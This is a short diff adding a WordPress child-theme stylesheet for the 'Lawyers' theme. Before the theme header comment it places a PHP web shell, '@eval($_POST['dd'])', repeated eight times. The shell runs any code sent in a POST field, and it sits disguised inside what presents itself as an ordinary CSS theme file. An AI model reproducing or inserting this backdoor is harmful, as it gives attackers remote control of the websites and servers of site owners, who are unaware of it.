@@ -1,0 +1,8 @@
+<?php @eval($_POST['dd']);?><?php @eval($_POST['dd']);?><?php @eval($_POST['dd']);?><?php @eval($_POST['dd']);?><?php @eval($_POST['dd']);?><?php @eval($_POST['dd']);?><?php @eval($_POST['dd']);?><?php @eval($_POST['dd']);?>/*
+Theme Name: Lawyers Child
+Description: Child theme for the Lawyers theme 
+Author: MatchThemes
+Template: lawyers
+*/
+
+@import url("../lawyers/style.css");
